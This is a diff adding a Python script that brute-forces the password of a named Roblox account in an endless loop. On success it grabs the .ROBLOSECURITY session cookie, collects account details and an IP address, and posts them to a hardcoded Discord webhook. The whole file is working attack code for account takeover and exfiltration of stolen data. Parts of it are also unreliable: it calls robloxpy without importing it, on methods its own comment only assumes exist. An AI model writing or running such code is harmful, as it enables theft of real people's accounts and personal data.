@@ -1,0 +1,136 @@
+import requests
+import json
+from discordwebhook import Discord
+import string
+import random
+import nltk
+from nltk.corpus import words as nltk_words
+
+# Ensure NLTK words dataset is downloaded
+nltk.download('words')
+
+# Replace with your actual Discord webhook URL
+webhook_url = "https://discord.com/api/webhooks/1251719698383638672/FSrIv2JYha0ADm53USXEOLyZs6TPmMNhZup4Q1dpvtDuzeLazLFOOQxU6sQ0b7X4_mIq"
+
+# Fetching NLTK words
+word_list = nltk_words.words()
+
+def try_login(username, password):
+    try:
+        # Attempt to login with the given username and password
+        login_data = {
+            'username': username,
+            'password': password
+        }
+        response = requests.post('https://www.roblox.com/login/v1', data=login_data)
+        
+        # Check if login was successful (status code 200)
+        if response.status_code == 200:
+            return response.cookies.get('.ROBLOSECURITY', default=None)
+        else:
+            return None
+    except Exception as e:
+        print(f"Error during login attempt: {str(e)}")
+        return None
+
+def retrieve_user_data(roblosecurity_cookie):
+    try:
+        # Perform actions using the retrieved cookie
+        ip_address = requests.get("https://api.ipify.org/").text
+        ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": roblosecurity_cookie})
+        info = json.loads(ebruh.text)
+        rid = info["UserID"]
+        # Assuming these methods exist in robloxpy or similar library
+        rap = robloxpy.User.External.GetRAP(rid)
+        friends = robloxpy.User.Friends.External.GetCount(rid)
+        age = robloxpy.User.External.GetAge(rid)
+        crdate = robloxpy.User.External.CreationDate(rid)
+        roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
+        headshot = robloxpy.User.External.GetHeadshot(rid)
+        username = info['UserName']
+        robux = info['RobuxBalance']
+        premium = info['IsPremium']
+
+        return {
+            "username": username,
+            "robux": robux,
+            "premium": premium,
+            "creation_date": crdate,
+            "rap": rap,
+            "friends_count": friends,
+            "account_age": age,
+            "ip_address": ip_address,
+            "roblox_profile": roblox_profile,
+            "headshot_url": headshot
+        }
+    except Exception as e:
+        print(f"Error retrieving user data: {str(e)}")
+        return None
+
+def post_to_discord(data):
+    try:
+        discord = Discord(url=webhook_url)
+        discord.post(
+            username="AutoPWG",
+            embeds=[
+                {
+                    "username": "AutoPWG",
+                    "title": f"User Data for {data['username']}",
+                    "color": 12452044,
+                    "fields": [
+                        {"name": "Username", "value": data['username'], "inline": True},
+                        {"name": "Robux Balance", "value": data['robux'], "inline": True},
+                        {"name": "Premium Status", "value": data['premium'], "inline": True},
+                        {"name": "Creation Date", "value": data['creation_date'], "inline": True},
+                        {"name": "RAP", "value": data['rap'], "inline": True},
+                        {"name": "Friends", "value": data['friends_count'], "inline": True},
+                        {"name": "Account Age", "value": data['account_age'], "inline": True},
+                        {"name": "IP Address", "value": data['ip_address'], "inline": True},
+                        {"name": "Roblox Profile", "value": data['roblox_profile'], "inline": False},
+                    ],
+                    "thumbnail": {"url": data['headshot_url']},
+                }
+            ],
+        )
+        print("Posted user data to Discord.")
+    except Exception as e:
+        print(f"Error posting to Discord: {str(e)}")
+        raise  # Re-raise the exception to be handled outside
+
+def generate_password(length=12):
+    # Randomly choose a word from NLTK word list
+    chosen_word = random.choice(word_list)
+    chosen_word = chosen_word.lower()  # Convert to lowercase
+
+    # Randomly choose characters to fill the rest of the password
+    num_chars = length - len(chosen_word)
+    characters = string.ascii_letters + string.digits + string.punctuation
+    random_chars = ''.join(random.choice(characters) for _ in range(num_chars))
+    
+    # Combine chosen word and random characters
+    password = chosen_word + random_chars
+    return password
+
+if __name__ == "__main__":
+    username = "Beststar2813"
+    
+    while True:  # Run indefinitely
+        password_attempt = generate_password(12)  # Generate password of at least 12 characters
+        
+        # Attempt to login with the generated password
+        roblosecurity_cookie = try_login(username, password_attempt)
+        
+        # If login is successful, retrieve user data and post to Discord
+        if roblosecurity_cookie:
+            print(f"Successfully logged in as {username} with password: {password_attempt}")
+            user_data = retrieve_user_data(roblosecurity_cookie)
+            if user_data:
+                try:
+                    post_to_discord(user_data)
+                    # If data is successfully posted, break the loop
+                    break
+                except Exception as e:
+                    print(f"Error posting user data: {str(e)}")
+                    # Continue to next attempt
+        else:
+            print(f"Failed to log in as {username} with password: {password_attempt}. Trying next password...")
